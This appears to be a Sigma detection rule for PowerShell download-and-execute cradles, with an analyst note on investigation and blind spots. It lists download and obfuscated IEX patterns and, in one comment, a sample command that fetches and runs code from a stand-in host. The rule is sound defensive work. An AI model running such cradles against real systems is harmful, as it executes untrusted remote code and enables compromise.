title: PowerShell Download and Execution Cradles
id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
status: test
description: Detects PowerShell download and execution cradles.
references:
- https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
- https://labs.withsecure.com/publications/fin7-target-veeam-servers
author: Florian Roth (Nextron Systems)
date: 2022-03-24
modified: 2025-07-18
tags:
- attack.execution
- attack.t1059
logsource:
  product: windows
  category: process_creation
detection:
  selection_download:
    CommandLine|contains:
    - '.DownloadString('
    - '.DownloadFile('
    - 'Invoke-WebRequest '
    - 'iwr '
    - 'Invoke-RestMethod '
    - 'irm '          # powershell -ep bypass -w h -c irm test.domain/ffe | iex
  selection_iex:
    CommandLine|contains:
    - ';iex $'
    - '| IEX'
    - '|IEX '
    - 'I`E`X'
    - 'I`EX'
    - 'IE`X'
    - 'iex '
    - 'IEX ('
    - 'IEX('
    - 'Invoke-Expression'
  condition: all of selection_*
falsepositives:
- Some PowerShell installers were seen using similar combinations. Apply filters
  accordingly
level: high
note: |
  ### Technical Context

  This Sigma rule detects suspicious PowerShell commands involving download and execution cradles, typically seen in malware delivery methods. The likely attacker objective is to execute remote code by downloading a payload from a malicious source and then running it in memory, often to evade detection. This behavior correlates with the MITRE ATT&CK tactic of Execution (T1203) and the technique of Command-Line Interface (T1059). The primary telemetry source is Windows process creation logs, specifically Security Event ID 4688 and Sysmon Event ID 1, capturing command line arguments. If malicious, this behavior could lead to unauthorized access, data exfiltration, or system compromise. However, this detection alone does not confirm that a malicious payload was successfully executed, as it only indicates potentially dangerous command patterns.

  ### Investigation Steps

  - **Confirm the command line arguments:** Check Security Event ID 4688 for process creation logs containing 'DownloadString(', 'DownloadFile(', 'Invoke-WebRequest', or 'IEX'. Look for other processes that reference these command sequences as a valid indicator.
  - **Identify potentially malicious execution:** Look for Sysmon Event ID 1 showing 'Invoke-Expression' followed by external URLs or suspicious script paths executed in memory. Typical malicious commands include downloading scripts for lateral movement or data exfiltration.
  - **Review expected organizational behavior:** Examine legitimate PowerShell usage patterns, like internal script executions or trusted administrative tasks, to establish baseline behavior. Use specific command lines that do not involve external web requests.
  - **Assess file creation or execution artifacts:** If the alert triggers on a system classified as critical (e.g., Domain Controller, Database server), verify logs for any unexpected file writes, which would indicate that a downloaded payload may have created artifacts on disk.
  - **Cross-reference user context:** Analyze user information from the associated events to determine if the account used for the execution is an authorized administrator or a non-privileged account, which may signify a potential compromise.

  ### Prioritization

  This alert is classified as high severity due to the potential impact of an attacker executing code on critical systems via PowerShell, which is a commonly weaponized technique by threat actors. The likelihood of abuse is significant, especially against endpoints that interact with sensitive data or administrative functions.

  ### Blind Spots and Assumptions

  Detection may be limited by evasion techniques such as the use of obfuscated command lines or encoded PowerShell scripts that would bypass this rule. Reliable detection requires proper configuration of logging for both PowerShell scripts and process creations to ensure no legitimate functions trigger false positives. Legitimate activities that may occur include the use of trusted deploy scripts or software installers that mimic these commands. A related detection to consider is monitoring for unusual outbound network connections made immediately after the execution of PowerShell commands to strengthen overall coverage against command and control activities.

